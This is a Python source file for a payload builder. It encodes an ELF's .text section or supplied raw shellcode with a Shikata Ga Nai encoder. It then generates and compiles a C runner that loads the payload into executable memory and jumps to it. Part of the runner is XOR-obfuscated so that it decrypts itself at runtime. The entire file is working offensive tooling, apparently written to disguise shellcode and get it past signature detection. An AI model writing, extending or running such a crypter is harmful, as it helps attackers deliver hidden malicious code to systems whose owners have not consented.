#!/usr/bin/env python3
import argparse
import os
import subprocess
import sys
import tempfile
import shutil
import random

# Import the ShikataGaNaiEncoder from our previous module.
try:
    from shikata_ga_nai import ShikataGaNaiEncoder
except ImportError:
    sys.exit("Error: Cannot import shikata_encoder module. Make sure it is in the same directory.")

def detect_arch(elf_file):
    """
    Detect whether the input ELF is 32-bit or 64-bit.
    Uses 'readelf -h' to parse the ELF header.
    Returns "x32" or "x64".
    """
    try:
        out = subprocess.check_output(["readelf", "-h", elf_file], universal_newlines=True)
    except Exception as e:
        sys.exit(f"Error calling readelf: {e}")
    for line in out.splitlines():
        if "Class:" in line:
            if "ELF32" in line:
                return "x32"
            elif "ELF64" in line:
                return "x64"
    sys.exit("Unable to determine ELF class.")

def extract_text_section(input_file):
    """
    Extract the .text section from a full ELF file using objcopy.
    Returns the raw binary data of the .text section.
    """
    temp_extracted = os.path.join(tempfile.gettempdir(), "extracted.bin")
    try:
        subprocess.check_call(["objcopy", "-O", "binary", "-j", ".text", input_file, temp_extracted])
    except subprocess.CalledProcessError as e:
        sys.exit(f"Failed to extract .text section using objcopy: {e}")
    with open(temp_extracted, "rb") as f:
        data = f.read()
    os.remove(temp_extracted)
    return data

def generate_runner_c(encoded_payload, arch):
    """
    Generate a C source code string for the runner.
    
    This runner embeds the encoded payload (raw shellcode) and defines a single,
    contiguous marker array (__decrypt_region) that holds the start, marker, and end
    strings. The macros __decrypt_start, __decrypt_marker, and __decrypt_end are defined
    as offsets into this array.
    
    At runtime, runner_entry() calls self_decrypt_region() to brute‑force the weak XOR key
    (0x42) over the region between __decrypt_start and __decrypt_end. Once decrypted,
    the runner allocates executable memory, copies the embedded payload there, and transfers control.
    
    The postprocess step will search for the marker strings "DECO_START" and "DECO_END"
    within the final ELF and XOR-encrypt that contiguous region.
    """
    # Combine markers into one contiguous array.
    # Here, __decrypt_region will contain "DECO_START" immediately followed by "DECO_END".
    # We assume that the expected marker (for verification) is the first 4 bytes ("DECO").
    c_code = f'''\
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#define WEAK_KEY 0x42

// Combined marker region; this must be contiguous.
char __decrypt_region[] = "DECO_STARTDECO_END";

// Define macros for the self-decrypting region.
#define __decrypt_start (__decrypt_region)
#define __decrypt_marker (__decrypt_region)
#define __decrypt_end (__decrypt_region + sizeof(__decrypt_region) - 1)

// Forward declarations for the embedded payload.
extern unsigned char encoded_payload[];
extern size_t payload_size;

// Self-decryption routine.
// It brute-forces the XOR key on the memory region from __decrypt_start to __decrypt_end
// until the first 4 bytes decrypt to "DECO". Dynamic allocation is used to avoid stack overflows.
void self_decrypt_region() {{
    unsigned char *start = (unsigned char *)__decrypt_start;
    unsigned char *end = (unsigned char *)__decrypt_end;
    size_t region_size = end - start;
    int key;
    unsigned char *temp = (unsigned char *)malloc(region_size);
    if (!temp) {{
        perror("malloc");
        exit(1);
    }}
    for (key = 0; key < 256; key++) {{
        memcpy(temp, start, region_size);
        for (size_t i = 0; i < region_size; i++) {{
            temp[i] ^= key;
        }}
        if (memcmp(temp, __decrypt_marker, 4) == 0) {{
            for (size_t i = 0; i < region_size; i++) {{
                start[i] ^= key;
            }}
            free(temp);
            return;
        }}
    }}
    free(temp);
    fprintf(stderr, "Failed to self-decrypt runner region.\\n");
    exit(1);
}}

// Runner entry function.
// It self-decrypts the region, allocates executable memory,
// copies the embedded payload, and transfers control.
void runner_entry() {{
    self_decrypt_region();
    void *exec_mem = mmap(NULL, payload_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {{
        perror("mmap");
        exit(1);
    }}
    memcpy(exec_mem, encoded_payload, payload_size);
#if defined(__i386__) || defined(__x86_64__)
    __builtin___clear_cache((char*)exec_mem, (char*)exec_mem + payload_size);
#endif
    void (*payload_func)() = exec_mem;
    payload_func();
    exit(0);
}}

// Embedded encoded payload.
unsigned char encoded_payload[] = {{
{", ".join("0x{:02x}".format(b) for b in encoded_payload)}
}};
size_t payload_size = sizeof(encoded_payload);

int main(int argc, char *argv[]) {{
    runner_entry();
    return 0;
}}
'''
    return c_code

def compile_runner(c_source, arch, output_filename):
    """
    Compile the generated C source into an ELF file using gcc.
    For x32, the -m32 flag is added.
    Disables stack protection and enables an executable stack.
    """
    tmp_dir = tempfile.mkdtemp(prefix="runner_build_")
    c_file = os.path.join(tmp_dir, "runner.c")
    with open(c_file, "w") as f:
        f.write(c_source)
    gcc_cmd = ["gcc", c_file, "-o", output_filename, "-fno-stack-protector", "-z", "execstack"]
    if arch == "x32":
        gcc_cmd.insert(1, "-m32")
    try:
        subprocess.check_call(gcc_cmd)
    except subprocess.CalledProcessError as e:
        shutil.rmtree(tmp_dir)
        sys.exit(f"gcc compilation failed: {e}")
    shutil.rmtree(tmp_dir)

def postprocess_runner(runner_filename):
    """
    Post-process the compiled ELF runner.
    
    Opens the runner binary, locates the region between the marker strings "DECO_START" and "DECO_END",
    and XOR-encrypts that region with the weak key (0x42). The final ELF will not include the key;
    at runtime the runner will brute-force it.
    """
    with open(runner_filename, "rb") as f:
        data = bytearray(f.read())
    marker_start = b"DECO_START"
    marker_end = b"DECO_END"
    start_idx = data.find(marker_start)
    end_idx = data.find(marker_end)
    if start_idx == -1 or end_idx == -1 or end_idx <= start_idx:
        sys.exit("Failed to locate decryption markers in the runner binary.")
    for i in range(start_idx, end_idx):
        data[i] ^= 0x42
    with open(runner_filename, "wb") as f:
        f.write(data)

def main():
    parser = argparse.ArgumentParser(
        description="Builder: Encodes an ELF or raw shellcode using Shikata Ga Nai and builds a self-decrypting Linux runner ELF.",
        epilog=(
            "Usage Examples:\n"
            "  1. Build a runner for a full ELF executable (extracting .text):\n"
            "         python3 linux_builder.py -f input.elf -o final_runner.elf\n\n"
            "  2. Build a runner for raw shellcode provided as a hex string:\n"
            "         python3 linux_builder.py -s \"4831ff4831c0b03c0f05\" -o final_runner.elf --arch x64\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="Input ELF file (full executable) to encode")
    group.add_argument("-s", "--string", help="Raw shellcode as a hex string (e.g., \"4831ff4831c0b03c0f05\")")
    parser.add_argument("-o", "--output", required=True, help="Output ELF file (final runner)")
    parser.add_argument("--arch", choices=["x32", "x64"], default="x64",
                        help="Target architecture (required for raw shellcode input; auto-detected for full ELF)")
    args = parser.parse_args()

    if args.string:
        try:
            payload_data = bytes.fromhex(args.string)
        except ValueError as e:
            sys.exit(f"Error parsing hex string: {e}")
        arch = args.arch
        is_raw = True
    else:
        if not os.path.isfile(args.file):
            sys.exit("Input file not found.")
        print("[*] Extracting .text section from full ELF...")
        payload_data = extract_text_section(args.file)
        arch = detect_arch(args.file)
        is_raw = False

    print(f"[+] Detected architecture: {arch}")
    print(f"[+] Payload data size: {len(payload_data)} bytes")

    encoder = ShikataGaNaiEncoder(arch=arch)
    encoded_payload = encoder.encode(payload_data)
    print(f"[+] Encoded payload size: {len(encoded_payload)} bytes")

    runner_c_code = generate_runner_c(encoded_payload, arch)
    runner_filename = args.output + ".tmp"
    compile_runner(runner_c_code, arch, runner_filename)
    print("[+] Runner compiled successfully.")

    postprocess_runner(runner_filename)
    print("[+] Runner post-processed (self-decrypting region XOR-encrypted).")

    shutil.move(runner_filename, args.output)
    print(f"[+] Final runner ELF generated: {args.output}")

if __name__ == "__main__":
    main()
